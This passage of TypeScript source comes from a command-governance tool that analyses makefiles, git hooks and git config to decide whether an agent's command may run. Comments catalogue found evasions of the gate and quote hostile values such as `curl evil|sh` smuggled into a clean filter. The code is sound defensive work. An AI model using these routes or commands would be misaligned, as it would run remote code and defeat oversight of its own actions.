        // `ifdef PROD / .DEFAULT_GOAL := safe / endif` with PROD unset builds the first target, and taking the
        // conditional assignment as the answer resolved `safe` while make ran `deploy` (self-attack on exit
        // review 9). The first target is a candidate too; it is recorded as one the moment the goal becomes
        // conditional, because the rule that defines it may not have been read yet.
        model.altGoals.add('\0firstTarget');
      }
      model.defaultGoal = g;
      current = null;
      continue;
    }
    // NOT EVERY TARGET THAT BEGINS WITH A DOT IS SPECIAL. Skipping all of them dropped three real recipes:
    // `.DEFAULT`, which make runs for ANY goal that has no rule of its own; an old-style SUFFIX rule like `.c.o:`,
    // which builds a target no literal rule names; and an ordinary target a project simply chose to call
    // `.deploy`, whose recipe then ran under ALLOW even as a prerequisite (exit review 6). Only the special
    // targets that genuinely define no recipe are skipped, and they are named.
    const MAKE_NO_RECIPE_SPECIALS =
      /^\.(PHONY|SUFFIXES|PRECIOUS|INTERMEDIATE|SECONDARY|SECONDEXPANSION|DELETE_ON_ERROR|IGNORE|LOW_RESOLUTION_TIME|SILENT|EXPORT_ALL_VARIABLES|NOTPARALLEL|POSIX|ONESHELL|DEFAULT_GOAL|RECIPEPREFIX|MAKEFLAGS|NOTINTERMEDIATE)(?=\s*::?|\s*$)/;
    if (MAKE_NO_RECIPE_SPECIALS.test(trimmed)) {
      current = null;
      continue;
    }
    // a rule: `targets [: | ::] prereqs [; recipe]`. A target or prerequisite list built from a variable is
    // recorded as unsupported rather than parsed as a literal name.
    // GNU make strips the COMMENT before it looks for the `;` that starts a one-line recipe, so in `deploy: ## Deploy;
    // never run git push by hand` the text after the semicolon is prose (exit review 10, self-attack)
    const ruleLine = line.replace(/(^|[^\\])#.*$/, '$1');
    const rule = /^([^:=#]+?)\s*::?(?!=)\s*([^;]*)(?:;(.*))?$/.exec(ruleLine);
    // ONLY A TAB MARKS A RECIPE. GNU make accepts a rule line indented with SPACES, and rejecting every
    // whitespace-led line made `  deploy:` invisible: `make deploy` force-pushed under a proven-absent claim
    // (exit review 7).
    if (rule && !/^\t/.test(line)) {
      const targets = rule[1]!.trim().split(/\s+/).filter(Boolean);
      // A TARGET-SPECIFIC VARIABLE IS NOT A PREREQUISITE LIST. `deploy: DOCKER = docker --context production rm
      // -f app` overrides DOCKER for that target's recipes, and it was parsed as a rule whose prerequisites are
      // the words of the assignment — so the recipe `$(DOCKER)` was expanded with the GLOBAL value and the
      // production command it really runs was never seen (exit review 7).
      // THE WHOLE TAIL IS THE VALUE. In GNU make 3.81 a target-specific assignment takes everything after the operator
      // - a `;` and what follows it included - and creates no recipe: `run: V = true; echo X` gives V the value
      // `true; echo X`, which runs only where `$(V)` is expanded. (An earlier revision of this parser read the tail as a
      // recipe on the strength of an experiment that could not tell the two apart; both print the same lines.)
      const whole = (rule[3] !== undefined ? `${rule[2]};${rule[3]}` : rule[2]!).trim();
      const tsv = /^((?:override\s+|export\s+|private\s+)*)([A-Za-z_][A-Za-z0-9_.]*)\s*(::?:?=|[+?!]=|=)\s*(.*)$/.exec(whole);
      if (tsv) {
        // what this parser does not model is REPORTED, not approximated: an appending or conditional assignment, a
        // keyword in front of it, or a PATTERN-specific variable each change what the recipe expands to in ways a plain
        // replacement gets wrong in BOTH directions
        const op = tsv[3]!;
        const unmodelled =
          tsv[1]!.trim() !== '' ? `a target-specific assignment with ${tsv[1]!.trim()}` :
          /^[+?!]=$/.test(op) ? `a target-specific ${op} assignment` :
          targets.some((t) => t.includes('%')) ? 'a pattern-specific variable' : null;
        for (const t of targets) {
          const m = model.targetVars.get(t) ?? new Map<string, string>();
          m.set(tsv[2]!, tsv[4]!);
          model.targetVars.set(t, m);
          if (unmodelled) model.unsupportedFor.set(t, [...(model.unsupportedFor.get(t) ?? []), `${unmodelled}: ${whole}`]);
        }
        if (unmodelled && targets.some((t) => t.includes('%'))) model.unsupported.push(`${unmodelled}: ${whole}`);
        continue;
      }
      const prereqs = rule[2]!.trim().split(/\s+/).filter(Boolean);
      // A target that can build something NO LITERAL RULE DEFINES makes "this goal has no rule, so nothing runs"
      // false. A `%` pattern is one; so are `.DEFAULT`, which make runs for any goal with no rule of its own, and
      // an old-style SUFFIX rule like `.c.o:` — both reached ALLOW by proving a target absent that make in fact
      // builds (exit review 6).
      if (targets.some((t) => /[%$]/.test(t) || /^\.DEFAULT$/i.test(t) || /^\.[A-Za-z0-9_+-]+\.[A-Za-z0-9_+-]+$/.test(t)))
        model.hasPatternRules = true;
      const shared: MakeRule = { recipes: [], prereqs };
      if (rule[3] && rule[3].trim()) shared.recipes.push(rule[3].trim()); // `target: ; cmd` one-line form
      // the recipes array is the LIVE one: the recipe lines that follow this rule are appended to it
      for (const t of targets)
        if (t.includes('%') && !t.includes('$')) model.patternRules.push({ target: t, prereqs, recipes: shared.recipes });
      const localBlind = [...openConditions];
      if (prereqs.some((p) => /[$]/.test(p))) localBlind.push(`computed prerequisites: ${trimmed}`);
      for (const raw of targets) {
        // `./deploy:` AND `deploy:` ARE THE SAME TARGET: make canonicalises a leading `./` away, so a makefile
        // may define the safe recipe under one spelling and the dangerous one under the other. Registered
        // under the CANONICAL name, the two merge exactly as two `::` rules do, and `make deploy` sees both
        // (self-attack on exit review 9).
        const t = raw.replace(/^(?:\.\/+)+/, '') || raw;
        if (localBlind.length) model.unsupportedFor.set(t, [...(model.unsupportedFor.get(t) ?? []), ...localBlind]);
        const existing = model.rules.get(t);
        if (existing) {
          // both branches of a conditional, or a `::` rule declared twice: keep EVERY recipe, never the last one
          existing.prereqs.push(...prereqs);
          existing.recipes.push(...shared.recipes);
          current = existing;
        } else {
          model.rules.set(t, shared);
          current = shared;
        }

        // A TARGET BEGINNING WITH A DOT IS SPECIAL ONLY IF IT HAS NO SLASH. That is make's own rule for picking
        // the default goal — ".PHONY" is skipped, "./deploy" is an ordinary file target and IS the default —
        // and skipping both made a makefile whose first rule is `./deploy:` resolve to no goal at all, so its
        // `git push origin main` was never seen (exit review 9).
        if (!model.firstTarget && !(t.startsWith('.') && !t.includes('/'))) model.firstTarget = t;
      }
      continue;
    }
    current = null;
  }
  // AN INCLUDED MAKEFILE THAT THIS MAKEFILE REMAKES IS A PRE-IMAGE. make remakes it, then RE-EXECUTES itself
  // with the new content, so what this parser read is not what will run — a `deploy:` that did not exist when
  // EGO looked now pushes to the remote (exit review 7).
  for (const name of included)
    if (model.rules.has(name)) model.unsupported.push(`an included makefile is remade by this makefile: ${name}`);
  return model;
}

/** The default makefile `make` would open in `dir`, in GNU make's precedence order, named by its REAL directory
 *  entry so path comparisons hold on case-insensitive filesystems. */
function defaultMakefile(dir: string): string[] {
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return [];
  }
  const byLower = new Map<string, string>();
  for (const e of entries) if (!byLower.has(e.toLowerCase())) byLower.set(e.toLowerCase(), e);
  for (const name of ['GNUmakefile', 'makefile', 'Makefile']) {
    const real = entries.includes(name) ? name : byLower.get(name.toLowerCase());
    if (real && fileExists(join(dir, real))) return [join(dir, real)];
  }
  return [];
}

/* AMBIENT EXECUTION CLOSURE, INDEXED BY EVENT.
 *
 * Modelling hooks as `verb -> hook names` is wrong about git: `reference-transaction` fires on ANY ref update and
 * `post-index-change` on any index change, whatever the verb that caused it, and several verbs raise events the
 * table did not list (challenge 6, findings 30, 31). The closure is therefore computed in two steps — the SEMANTIC
 * EVENTS an operation raises, then the hooks those events fire — so a verb added later only has to declare what it
 * DOES, and a hook added later only has to declare what it listens to.
 */
type GitEvent =
  | 'commit-created'
  | 'commit-message'
  | 'merge'
  | 'checkout'
  | 'rewrite'
  | 'push'
  | 'patch-apply'
  | 'ref-update'
  | 'index-change';

/** What each git verb DOES, semantically. */
const GIT_VERB_EVENTS: Record<string, GitEvent[]> = {
  commit: ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  merge: ['merge', 'commit-message', 'commit-created', 'ref-update', 'index-change'],
  // `git pull --rebase` REBASES, and a rebase fires `pre-rebase` and `post-rewrite` — neither of which this
  // verb listed, so a repository carrying those hooks had them run under a resolution that claimed to have read
  // every hook the command fires (exit review 10). The flag is not tested here because `pull.rebase` in the
  // config turns it on without appearing on the line at all.
  pull: ['merge', 'checkout', 'ref-update', 'index-change', 'rewrite'],
  fetch: ['ref-update'],
  checkout: ['checkout', 'ref-update', 'index-change'],
  switch: ['checkout', 'ref-update', 'index-change'],
  restore: ['index-change'],
  add: ['index-change'],
  rm: ['index-change'],
  mv: ['index-change'],
  clone: ['checkout', 'ref-update'],
  rebase: ['rewrite', 'checkout', 'commit-created', 'ref-update', 'index-change'],
  push: ['push', 'ref-update'],
  am: ['patch-apply', 'commit-created', 'ref-update', 'index-change'],
  apply: ['index-change'],
  'cherry-pick': ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  revert: ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  stash: ['index-change', 'ref-update'],
  reset: ['ref-update', 'index-change'],
  branch: ['ref-update'],
  tag: ['ref-update'],
  'update-ref': ['ref-update'],
  worktree: ['checkout', 'ref-update'],
  'filter-branch': ['rewrite', 'ref-update'],
  bisect: ['checkout', 'ref-update'],
  // `post-index-change` fires whenever the index is REFRESHED, which `status`, `diff` and `stash list` all do —
  // so a hook installed there ran on the most ordinary read commands while EGO resolved no hook at all and left
  // `git status` at ALLOW (exit review 6).
  status: ['index-change'],
  diff: ['index-change'],
  grep: ['index-change'],
  'ls-files': ['index-change'],
  describe: ['index-change'],
  submodule: ['checkout', 'ref-update', 'index-change'],
  'sparse-checkout': ['checkout', 'index-change'],
  'read-tree': ['index-change'],
  'update-index': ['index-change'],
  'checkout-index': ['index-change'],
  'symbolic-ref': ['ref-update'],
  notes: ['ref-update'],
  replace: ['ref-update'],
  gc: ['ref-update'],
  prune: ['ref-update'],
  'send-pack': ['push', 'ref-update'],
  subtree: ['push', 'ref-update', 'index-change'],
};

/** What each hook listens to. */
const GIT_HOOK_EVENTS: Record<string, GitEvent[]> = {
  'pre-commit': ['commit-created'],
  'prepare-commit-msg': ['commit-message'],
  'commit-msg': ['commit-message'],
  'post-commit': ['commit-created'],
  'pre-merge-commit': ['merge'],
  'post-merge': ['merge'],
  'post-checkout': ['checkout'],
  'pre-rebase': ['rewrite'],
  'post-rewrite': ['rewrite'],
  'pre-push': ['push'],
  'applypatch-msg': ['patch-apply'],
  'pre-applypatch': ['patch-apply'],
  'post-applypatch': ['patch-apply'],
  'reference-transaction': ['ref-update'],
  'post-index-change': ['index-change'],
};

/** The hooks a verb's events fire, minus the events a suppression flag actually bypasses. */
function hooksFor(verb: string, suppressed: readonly GitEvent[] = []): string[] {
  const events = new Set(GIT_VERB_EVENTS[verb] ?? []);
  for (const e of suppressed) events.delete(e);
  // `--no-verify` on a commit bypasses pre-commit and commit-msg; post-commit is NOT a verification hook and runs
  if (suppressed.includes('commit-message')) events.delete('commit-created');
  if (!events.size) return [];
  return Object.entries(GIT_HOOK_EVENTS)
    .filter(([, listens]) => listens.some((e) => events.has(e)))
    .map(([name]) => name);
}

/**
 * AMBIENT EXECUTION CLOSURE for git (A5). Executable content attached to repository STATE rather than named in the
 * command has no producer to invoke: `npm install` lets a dependency install a hook, and the next `git commit`
 * runs it — two individually-ALLOW decisions composing into unanalysed execution (challenge 5, finding 24).
 *
 * EGO's own governance shim is re-rendered and compared byte for byte, so it is recognised by PROVENANCE, not by a
 * producer deciding something is safe: a file identical to what EGO installed delegates to EGO itself and adds no
 * third-party body. Anything else — including the `.pre-ego` hooks the shim chains — is an ordinary body and goes
 * through the canonical analyzer.
 */
function resolveGitAmbient(ctx: EvaluationContext, tokens: string[], env: ExecutionEnvironment): ProducerResult {
  const verb = tokens.slice(1).find((t) => !t.startsWith('-'));
  if (!verb)
    return { kind: 'none', key: 'git:', body: null, reason: 'no verb', resolution: 'ABSENT_VERIFIED' };
  // SUPPRESSION IS PER-EVENT, NOT A SWITCH OVER THE WHOLE CLOSURE. `--no-verify` bypasses the VERIFICATION hooks
  // of one event — pre-commit/commit-msg on a commit, pre-push on a push — and nothing else: post-commit,
  // reference-transaction and post-index-change all still run. And a bare `-n` means `--no-verify` ONLY for
  // commit and push; for fetch it is --no-tags, for pull --no-stat, for merge --no-stat. Treating either as
  // "no hooks at all" turned the entire ambient closure off for every verb (challenge 7, finding 1) — the same
  // meta-defect this phase exists to remove: a rule applied at the place being inspected, missing its siblings.
  const noVerify =
    tokens.includes('--no-verify') || (tokens.includes('-n') && (verb === 'commit' || verb === 'push'));
  const suppressed: GitEvent[] = noVerify ? (verb === 'push' ? ['push'] : ['commit-message']) : [];
  const names = hooksFor(verb, suppressed);
  // PRODUCER SUBJECT IDENTITY. Every provenance leg asks "is this INPUT resolved?"; none asked "is the OBJECT
  // this producer resolved the object the command will act on?". The subject of `git` is the repository git
  // itself would resolve from the effective directory — `git rev-parse --show-toplevel`, adjusted by `-C` — not
  // the registered workspace root. A repository nested inside the workspace made EGO read the OUTER repository's
  // hooks and trust anchor while the INNER one's fired (challenge 8).
  const root = gitSubjectRepository(ctx, tokens, env);
  if (root === null)
    return {
      kind: 'git-ambient',
      key: `git-hooks:unknown:${verb}`,
      body: null,
      reason: `the hooks that \`git ${verb}\` fires live outside any registered repository`,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  // CONFIGURATION CLOSURE for git, independent of the hook table: several config keys name a PROGRAM git runs for
  // ordinary verbs — a clean/smudge filter on add and checkout, a textconv on diff, an fsmonitor on almost
  // everything. They are attached to the REPOSITORY, not to the command, so nothing else in the closure would ever
  // name them (challenge 6, finding 26). A repository that configures none of them is untouched.
  // LOCAL scope only. The operator's own global pager, editor or ssh command is their choice and is not part of
  // the repository's attack surface; gating on it would gate every `git status` on every developer machine. What
  // matters is config an agent or a dependency can write INTO THE CHECKOUT.
  const configFailed = { value: false };
  const configPrograms = gitLocalProgramValues(root, verb, configFailed);
  if (configFailed.value)
    return {
      kind: 'git-ambient',
      key: `git-config-unreadable:${root}:${verb}`,
      body: configPrograms.length ? configPrograms : null,
      bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
      reason: `the git configuration \`git ${verb}\` runs against could not be read in full`,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  if (!names.length && configPrograms.length)
    return {
      kind: 'git-ambient',
      key: `git-config-programs:${root}:${verb}`,
      body: configPrograms,
      bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
      reason: `programs this repository's git configuration runs for \`git ${verb}\``,
      resolution: 'RESOLVED_COMPLETE',
    };
  if (!names.length)
    return { kind: 'none', key: `git:${verb}`, body: null, reason: 'no hook event', resolution: 'ABSENT_VERIFIED' };
  // Ask git where hooks live instead of guessing `.git/hooks`. `core.hooksPath` (husky v9 sets it to `.husky`) and
  // a LINKED WORKTREE — whose `.git` is a file pointing at the main worktree's common dir — both move them, and
  // guessing made the relocated hook invisible while it still fired (challenge 6, finding 1). The kernel already
  // had the correct resolver; the evaluator was the one layer not using it.
  let dir: string;
  try {
    dir = gitHooksDir(root, gitConfigGet(root, 'core.hooksPath'));
  } catch {
    return {
      kind: 'git-ambient',
      key: `git-hooks:unresolved:${verb}`,
      body: null,
      reason: `the hooks directory \`git ${verb}\` runs from could not be determined`,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  }
  // A hooks directory EGO cannot read is not an absence: something WILL run that was never analysed.
  if (!directoryExists(dir))
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: null,
      reason: `the hooks directory \`git ${verb}\` runs from (${dir}) does not exist or is not readable`,
      resolution: dir.startsWith(root) ? 'ABSENT_VERIFIED' : 'AMBIENT_UNRESOLVED',
    };
  const body: string[] = [];
  const sources: string[] = [];
  let unresolved: string | null = null;
  body.push(...configPrograms);
  for (const name of names) {
    for (const file of chainedHookFiles(dir, name)) {
      const text = readInsideWorkspace(ctx, file);
      if (text === null) {
        unresolved = `${file} fires on \`git ${verb}\` but could not be read`;
        continue;
      }
      sources.push(file);
      if (text === shimScript(name)) {
        // TRUST IS TRANSITIVE. Recognising this file by identity elides its body — which transfers its closure
        // obligation to whatever it delegates to. The shim `exec`s `.harness/hooks/git-hook.sh`, a file inside the
        // mutable workspace it governs. A trusted entrypoint is only trusted while the WHOLE chain is resolved,
        // fingerprinted, fresh and inside the trust boundary (challenge 7, finding 14).
        const chain = trustChainComplete(ctx, root, env);
        if (chain === null) continue; // chain verified end to end: it delegates to EGO itself and adds no body
        unresolved = chain;
        continue;
      }
      const segs = scriptSegments(text);
      if (segs === null) {
        unresolved = `${file} fires on \`git ${verb}\` and builds its commands dynamically`;
        continue;
      }
      body.push(...segs);
    }
  }
  if (unresolved !== null)
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: body.length ? body : null,
      bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
      reason: unresolved,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  // no hook, or EGO's own shim only (recognised byte for byte): nothing third-party runs, and that IS proven —
  // the directory git will actually use was read, not guessed
  if (!body.length)
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: null,
      reason: `no hook fires for \`git ${verb}\``,
      resolution: 'ABSENT_VERIFIED',
    };
  return {
    kind: 'git-ambient',
    key: `git-hooks:${dir}:${verb}`,
    body,
    bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
    reason: `git hooks fired by \`git ${verb}\``,
    resolution: 'RESOLVED_COMPLETE',
    provenance: { source: sources.join(','), fingerprint: fingerprint(body.join('\n')) },
  };
}

/** Which verbs actually run each configured program. A content filter runs when git materialises or stages
 *  content; a textconv when git renders a diff; an ssh command only on the network verbs. */
const CONFIG_PROGRAM_VERBS: ReadonlyArray<readonly [RegExp, ReadonlySet<string>]> = [
  [
    /^filter\.[^.]+\.(clean|smudge|process)$/i,
    // A CLEAN FILTER RUNS WHENEVER GIT COMPARES THE WORKING TREE TO THE INDEX, which is every verb that reads
    // the tree — `status`, `diff`, `grep`, `ls-files`, `describe` — not only the ones that write it. Git runs
    // the filter to decide whether a stat-dirty file really changed, so `git status` in a repository whose own
    // config names a clean filter executes it (exit review 7).
    // ...but NOT `log`, `show` or `blame`: those read COMMITTED objects, where the content is already clean and
    // no filter runs. The line is the working tree, not "read versus write".
    new Set(['add', 'status', 'diff', 'grep', 'ls-files', 'describe', 'blame', 'cat-file', 'checkout', 'switch', 'restore', 'commit', 'merge', 'stash', 'clone', 'pull', 'reset', 'rm', 'mv', 'apply', 'am', 'cherry-pick', 'rebase', 'revert', 'archive', 'update-index', 'read-tree', 'checkout-index', 'diff-files', 'diff-index', 'sparse-checkout']),
  ],
  [/^diff\.[^.]+\.(textconv|command)$/i, new Set(['diff', 'show', 'log', 'blame', 'difftool', 'range-diff'])],
  [/^core\.fsmonitor$/i, new Set(['status', 'add', 'diff', 'commit', 'checkout', 'switch', 'restore', 'stash'])],
  [/^core\.pager$/i, new Set(['log', 'show', 'diff', 'blame', 'branch', 'tag', 'shortlog', 'grep'])],
  [/^core\.(sshCommand|gitProxy)$/i, new Set(['fetch', 'push', 'pull', 'clone', 'ls-remote', 'submodule', 'remote'])],
  // `remote.<n>.uploadpack` / `receivepack` NAME THE PROGRAM git runs to serve the transfer, and for a local or
  // `file://` remote git runs it on THIS machine (exit review 8).
  [/^remote\.[^.]+\.(uploadpack|receivepack|proxy)$/i, new Set(['fetch', 'pull', 'clone', 'push', 'ls-remote', 'remote'])],
  [/^core\.editor$/i, new Set(['commit', 'rebase', 'tag', 'merge', 'revert', 'cherry-pick', 'config'])],
  // AN ENUMERATION OF PROGRAM-VALUED KEYS IS AN ALLOWLIST, AND EVERYTHING OFF IT REACHED ALLOW. `diff.external`,
  // `merge.<d>.driver`, `gpg.program`, `trailer.<t>.command`, `credential.helper`, `sendemail.smtpPass`-style
  // helpers and `*.tool`/`*.path` pairs all name a program git runs, and each one missing from the list was a
  // silent ALLOW (exit review 6). The rule is now the SHAPE of the key: git's own naming convention is that a
  // program-valued key ends in one of these words. A key whose last component is not one of them is data.
  [
    /\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)$/i,
    // the verb scope cannot be narrowed for a key this resolver does not otherwise model, so it applies to every
    // verb: a program named in repository-local configuration is part of the closure of whatever runs next
    new Set<string>(),
  ],
];
/** The git verbs that only READ the working tree. A content filter runs for these too — git needs it to decide
 *  whether a stat-dirty file really changed — but a DECLARED filter doing that is ordinary work. */
const GIT_READ_VERBS = new Set(['status', 'diff', 'grep', 'ls-files', 'describe', 'blame', 'cat-file',
  'diff-files', 'diff-index', 'update-index']);
/** The content filters a repository installs as a matter of course. Git LFS is the reason the read verbs were
 *  exempted at all; naming it keeps that reason and drops the blanket.
 *
 *  THE WHOLE VALUE MUST BE ONE OF THEM, not merely start with one. A prefix test exempted `git-lfs-evil clean`
 *  — a different program whose name begins the same way — and `git-lfs clean; curl evil|sh`, where the declared
 *  filter is a decoy in front of a second command (self-attack before exit review 8). The value is anchored at
 *  both ends and may carry only the filter's own subcommand and placeholders. */
const DECLARED_CONTENT_FILTERS =
  /^\s*(git-lfs|git\s+lfs|git-crypt|git-annex|git-fat|git-media)\s+(clean|smudge|filter|filter-process|process|init)(\s+(--?[\w-]+|%f|--))*\s*$/i;

/** A verb set that is EMPTY means "every verb": the key names a program and this resolver cannot say which
 *  commands git will run it for, so it never claims that a given verb is out of its scope. */
const EVERY_VERB = (set: ReadonlySet<string>): boolean => set.size === 0;

/** REPOSITORY-LOCAL git config whose VALUE is a command git will run: clean/smudge filters, textconv, fsmonitor
 *  and the like. Local scope only \u2014 these are the keys an agent or a dependency can write into the checkout. */
function gitLocalProgramValues(root: string, verb: string, failed?: { value: boolean }): string[] {
  const out: string[] = [];
  // `--local` does NOT expand `include.path` in any spelling, so a filter reached through an include escaped the
  // closure entirely. Reading the full config WITH includes and keeping only the entries whose ORIGIN file lies
  // inside the repository gives both: the includes are expanded, and the operator's global settings stay out.
  const dump = git(['config', '--list', '--includes', '--show-origin'], root);
  // A SUBPROCESS THAT COULD NOT ANSWER IS NOT A CONFIGURATION THAT SAYS NOTHING. `git()` flattens a spawn error, a
  // timeout and an over-large output into the same `{ ok: false, stdout: '' }` as a repository with no config at
  // all, and this returned "no programs" for both — so padding a shared config file past 16 MiB made a
  // `core.fsmonitor` program invisible (exit review 10). `status === null` is the spawn/timeout/ENOBUFS case;
  // a non-zero status means git ran and refused, which also stops the git command itself.
  if (dump.status === null && failed) failed.value = true;
  if (!dump.ok || !dump.stdout) return out;
  const repo = canonicalPath(root);
  // every file the repository's OWN config pulls in with `include.path` / `includeIf.<cond>.path`, transitively
  const pulledIn = new Set<string>();
  {
    const seen = new Set<string>();
    const follow = (file: string, depth: number): void => {
      const abs = canonicalPath(file);
      if (depth > 4 || seen.has(abs)) return;
      seen.add(abs);
      let text: string;
      try {
        text = readFileSync(abs, 'utf8');
      } catch {
        return;
      }
      for (const m of text.matchAll(/^\s*path\s*=\s*(.+)$/gim)) {
        const raw = m[1]!.trim().replace(/^["']|["']$/g, '');
        const target = raw.startsWith('~/')
          ? join(homedir(), raw.slice(2))
          : isAbsolute(raw)
            ? raw
            : join(abs.slice(0, abs.lastIndexOf(sep)), raw);
        pulledIn.add(canonicalPath(target));
        follow(target, depth + 1);
      }
    };
    // the repository's own config is `<worktree>/.git/config`; a worktree or submodule keeps a `.git` FILE that
    // points at the real directory, which `git rev-parse --git-dir` resolves
    const gitDir = git(['rev-parse', '--absolute-git-dir'], root);
    const dir = gitDir.ok && gitDir.stdout.trim() ? gitDir.stdout.trim() : join(repo, '.git');
    follow(join(dir, 'config'), 0);
  }
  for (const raw of dump.stdout.split(/\r?\n/)) {
    // `file:<path>\t<key>=<value>`
    const tab = raw.indexOf('\t');
    if (tab < 0) continue;
    const origin = raw.slice(0, tab).replace(/^file:/, '');
    const originAbs = canonicalPath(isAbsolute(origin) ? origin : join(root, origin));
    // THE TEST IS WHO PULLS THE FILE IN, NOT WHERE IT SITS. Dropping every origin outside the repository excludes
    // the operator's own `~/.gitconfig`, which is right — and it also excluded a file the REPOSITORY'S OWN
    // `.git/config` names with `include.path`, which is the repository configuring itself through an indirection.
    // A clean filter reached that way ran on `git add .` at ALLOW (exit review 7).
    if (originAbs !== repo && !originAbs.startsWith(repo + sep) && !pulledIn.has(originAbs)) continue;
    const line = raw.slice(tab + 1);
    const eq = line.indexOf('=');
    if (eq < 0) continue;
    const key = line.slice(0, eq);
    const value = line.slice(eq + 1).trim();
    if (!value || value === 'false' || value === '0') continue;
    // `alias.<n> = !cmd` is a SHELL command git runs for `git <n>`. It sits in the same repository-local config
    // as the filters, and nothing else in the closure would ever name it.
    // ... scoped to the verb actually invoked: a repository with a legitimate `alias.lg = !git log` must not
    // carry that body into every other git command
    const alias = /^alias\.([^.]+)$/i.exec(key);
    if (alias) {
      if (alias[1] === verb && value.startsWith('!')) out.push(value.slice(1));
      continue;
    }
    // ... and each key is scoped to the verbs that actually invoke it. Applying every configured program to
    // every verb made `git status` and `git log` ask in any repository using Git LFS, which configures
    // `filter.lfs.clean` as its ordinary installation.
    // A CONTENT FILTER RUNS ON A READ TOO — and the reason the read verbs were excluded is Git LFS, so that is
    // what the exemption should name. Git runs `filter.<d>.clean` whenever it compares the working tree to the
    // index, which includes `git status` and `git diff`; excluding those verbs for EVERY filter let a hostile
    // `filter.evil.clean = curl …|sh` run under an ALLOW (exit review 7), while the decision that created the
    // exclusion was about `filter.lfs.clean`, which every LFS repository installs as a matter of course. So the
    // DECLARED content filters keep the exemption on the read verbs and an unknown program does not.
    const scope = CONFIG_PROGRAM_VERBS.find(([re]) => re.test(key));
    const isContentFilter = /^filter\.[^.]+\.(clean|smudge|process)$/i.test(key);
    if (isContentFilter && GIT_READ_VERBS.has(verb) && DECLARED_CONTENT_FILTERS.test(value)) continue;
    if (scope && EVERY_VERB(scope[1])) {
      out.push(value);
      continue;
    }
    if (scope && scope[1].has(verb)) out.push(value);
  }
  return out;
}

/** Verifies EGO's own delegation chain: the hook shim execs `.harness/hooks/git-hook.sh`, which `ego init` copies
 *  byte for byte from `<package>/runtime/posix/git-hook.sh`. Returns null when the chain is complete, or the reason
 *  it is not — a missing, unreadable, modified or stale delegate is an unanalysed body, not a trusted one. */
function trustChainComplete(ctx: EvaluationContext, root: string, env: ExecutionEnvironment): string | null {
  // The shim itself tries TWO bases: this worktree, and the MAIN worktree resolved from the shared git common
  // dir — a linked worktree shares `.git/hooks` but keeps its own, untracked `.harness/`. Checking only the first
  // made every commit in a linked worktree ask, which is EGO's own habitat (challenge 8, finding 22).
  const bases = [root];
  const common = gitCommonDir(root);
  if (common !== null) bases.push(common);
  const delegate = bases
    .map((b) => join(b, '.harness', 'hooks', 'git-hook.sh'))
    .find((f) => fileExists(f));
  if (delegate === undefined)
    return `${join(root, '.harness', 'hooks', 'git-hook.sh')} is the shim's delegate and is missing`;
  if (env.written.has('\0any') || env.written.has(canonicalPath(delegate)) || !env.treeFresh)
    return `${delegate} is the shim's delegate and this command may have replaced it`;
  const actual = readInsideWorkspace(ctx, delegate);
  if (actual === null) return `${delegate} is the shim's delegate and could not be read`;
  let shipped: string;
  try {
    shipped = readFileSync(join(packageRoot(), 'runtime', 'posix', 'git-hook.sh'), 'utf8');
  } catch {
    return `${delegate} is the shim's delegate and EGO's own copy of it could not be read for comparison`;
  }
  return actual === shipped ? null : `${delegate} is the shim's delegate and does not match what EGO installed`;
}

/** Every file `git <verb>` will execute for one hook name: the hook itself plus the `<name>.pre-ego*` chain EGO's
 *  own shim execs. Reading only the exact `<name>.pre-ego` missed `<name>.pre-ego.1` (challenge 6, finding 32). */
function chainedHookFiles(dir: string, name: string): string[] {
  const out: string[] = [];
  if (fileExists(join(dir, name))) out.push(join(dir, name));
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return out;
  }
  for (const e of entries.sort())
    if (e === `${name}.pre-ego` || e.startsWith(`${name}.pre-ego.`)) out.push(join(dir, e));
  return out;
}

const gitCommonDirCache = new Map<string, string | null>();
/** The MAIN worktree of a linked worktree: the parent of the shared git common dir. Memoised like the toplevel. */
function gitCommonDir(dir: string): string | null {
  const key = canonicalPath(dir);
  const hit = gitCommonDirCache.get(key);
  if (hit !== undefined) return hit;
  const r = git(['rev-parse', '--path-format=absolute', '--git-common-dir'], dir);
  const main = r.ok && r.stdout ? canonicalPath(dirname(r.stdout.trim())) : null;
  gitCommonDirCache.set(key, main === key ? null : main);
  return gitCommonDirCache.get(key) ?? null;
}

const gitToplevelCache = new Map<string, string | null>();
/** `git rev-parse --show-toplevel` for a directory, memoised for the life of the process. */
function gitToplevel(dir: string): string | null {
  const key = canonicalPath(dir);
  const hit = gitToplevelCache.get(key);
  if (hit !== undefined) return hit;
  const r = git(['rev-parse', '--show-toplevel'], dir);
  const top = r.ok && r.stdout ? canonicalPath(r.stdout.trim()) : null;
  gitToplevelCache.set(key, top);
  return top;
}

/** The repository `git` will actually act on: resolved from the effective directory the way git resolves it, and
 *  accepted only when it lies inside a registered root — EGO may not read hooks it has no mandate over. */
function gitSubjectRepository(
  ctx: EvaluationContext,
  tokens: string[],
  env: ExecutionEnvironment,
): string | null {
  let dir = env.cwd;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(?:--work-tree=|-C)(.+)$/.exec(t);
    if ((t === '-C' || t === '--work-tree') && tokens[i + 1]) dir = resolve(dir, tokens[i + 1]!);
    else if (eq) dir = resolve(dir, eq[1]!);
  }
  // A subprocess per git segment is far too expensive — the kernel has a 60 ms budget and the regression corpus
  // is 200k commands — and the answer only depends on the directory, so it is memoised. The common case does not
